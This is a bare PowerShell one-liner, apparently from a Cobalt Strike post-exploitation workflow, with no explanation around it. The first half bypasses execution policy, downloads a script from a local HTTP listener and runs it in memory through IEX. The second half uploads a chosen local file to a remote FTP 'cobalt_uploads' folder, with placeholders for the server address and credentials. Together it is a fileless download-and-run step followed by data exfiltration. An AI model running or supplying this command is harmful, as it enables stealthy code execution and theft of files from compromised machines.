powershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:43984/'); Add-FtpFile -ftpFilePath "ftp://<IP  Address>/cobalt_uploads/<file name>" -localFile "<local file path>\ <file name> " -userName "<username>" -password "<password>"

